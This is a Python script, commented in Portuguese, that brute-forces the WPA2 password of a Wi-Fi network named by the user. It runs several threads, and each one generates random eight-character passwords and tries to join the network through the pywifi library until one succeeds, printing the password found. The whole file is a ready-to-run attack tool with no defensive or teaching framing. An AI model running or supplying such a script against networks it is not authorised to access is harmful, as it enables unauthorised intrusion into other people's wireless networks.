import threading
import pywifi
from pywifi import const
import random
import string
import time

def generate_password(length=8):
    """Gera uma senha aleatória."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def wifi_test(ssid, password):
    """Tenta conectar-se à rede Wi-Fi com a senha fornecida."""
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.key = password
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(5)
        if iface.status() == const.IFACE_CONNECTED:
            print(f"[+] Conectado com sucesso à rede {ssid} com a senha: {password}")
            iface.disconnect()
            return True
        else:
            print(f"[-] Tentativa falhou. Senha: {password}")
    return False

def brute_force_with_threads(ssid, thread_id):
    """Executa força bruta com múltiplas threads."""
    while True:
        password = generate_password()
        print(f"Thread-{thread_id} tentando senha: {password}")
        if wifi_test(ssid, password):
            print(f"[+] Thread-{thread_id} encontrou a senha: {password}")
            break

if __name__ == "__main__":
    ssid = input("Digite o nome da rede (SSID): ")
    num_threads = int(input("Número de threads: "))

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=brute_force_with_threads, args=(ssid, i))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
